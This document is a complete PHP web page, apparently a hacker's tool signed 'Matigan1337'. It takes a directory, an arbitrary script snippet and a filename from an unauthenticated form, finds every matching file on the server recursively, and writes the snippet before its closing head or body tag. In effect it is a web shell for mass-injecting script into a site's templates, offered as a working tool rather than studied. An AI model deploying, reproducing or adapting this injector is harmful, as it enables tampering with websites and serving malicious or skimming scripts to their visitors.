<!-- CREATE BY MATIGAN1337 -->
<!-- CREATE BY MATIGAN1337 -->
<!-- CREATE BY MATIGAN1337 -->
<!-- CREATE BY MATIGAN1337 -->
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memasukkan Potongan Script Ke File</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            margin-top: 0; /* hilangkan margin default */
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"],
        textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        select {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }
        .success {
            background-color: #d4edda;
            border-color: #c3e6cb;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            border-color: #f5c6cb;
            color: #721c24;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        .heart {
            color: #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Memasukkan Potongan Script Ke File</h1>
        <form action="" method="post">
            <label for="directory">Path Direktori:</label>
            <input type="text" id="directory" name="directory" value="<?php echo htmlspecialchars(getcwd()); ?>">
            <label for="new_script">Potongan Script:</label>
            <textarea id="new_script" name="new_script" rows="4" cols="50"></textarea>
            <label for="position">Posisi Script:</label>
            <select id="position" name="position">
                <option value="head">Tag HEAD</option>
                <option value="body">Tag BODY</option>
            </select>
            <label for="filename">Nama File:</label>
            <input type="text" id="filename" name="filename" placeholder="Contoh: header.php">
            <input type="submit" value="Submit">
        </form>
        <?php
        // Periksa apakah ada input dari pengguna
        if(isset($_POST['directory']) && isset($_POST['new_script']) && isset($_POST['position']) && isset($_POST['filename'])) {
            // Ambil nilai dari input
            $directory = $_POST['directory'];
            $new_script = $_POST['new_script'];
            $position = $_POST['position'];
            $filename = $_POST['filename'];

            // Periksa apakah direktori yang dimasukkan oleh pengguna valid
            if(is_dir($directory)) {
                // Panggil fungsi untuk mencari file yang dimaksud secara rekursif
                findFile($directory, $new_script, $position, $filename);
            } else {
                // Jika direktori tidak valid, tampilkan pesan kesalahan
                echo '<div class="message error">Direktori tidak valid.</div>';
            }
        }

        // Fungsi untuk mencari file yang dimaksud secara rekursif di dalam direktori
        function findFile($directory, $new_script, $position, $filename) {
            // Cari semua file dan direktori di dalam direktori saat ini
            $files = glob($directory . '/*');

            // Iterasi melalui setiap file dan direktori
            foreach ($files as $file) {
                // Jika ini adalah direktori, rekursif cari di dalamnya
                if (is_dir($file)) {
                    findFile($file, $new_script, $position, $filename);
                } else {
                    // Jika file sesuai dengan nama file yang dimasukkan oleh pengguna, proses file tersebut
                    if (basename($file) === $filename) {
                        processFile($file, $new_script, $position);
                    }
                }
            }
        }

        // Fungsi untuk memproses file yang sesuai
        function processFile($file, $new_script, $position) {
            // Baca isi file
            $content = file_get_contents($file);

            // Cari posisi tag yang sesuai
            $tag = ($position === 'head') ? '</head>' : '</body>';
            $tag_pos = strpos($content, $tag);

            // Jika tag yang sesuai ditemukan
            if ($tag_pos !== false) {
                // Sisipkan script setelah tag yang sesuai
                $new_content = substr_replace($content, $new_script . "\n", $tag_pos, 0);

                // Tulis kembali isi file dengan script baru
                file_put_contents($file, $new_content);

                // Tampilkan pesan bahwa script berhasil ditambahkan
                echo '<div class="message success">Script berhasil ditambahkan ke file ' . $file . ' di dalam tag ' . $position . '.<br><strong>dibuat oleh Matigan1337</strong></div>';
            } else {
                // Tampilkan pesan bahwa tag tidak ditemukan
                echo '<div class="message error">Tag &lt;' . $position . '&gt; tidak ditemukan dalam file ' . $file . '.</div>';
            }
        }
        ?>
    </div>
    <div class="footer">
        Dibuat oleh Matigan1337<br>
        <span class="heart">Penjaga Sewa / Sewa Tersakiti</span>
    </div>
</body>
</html>
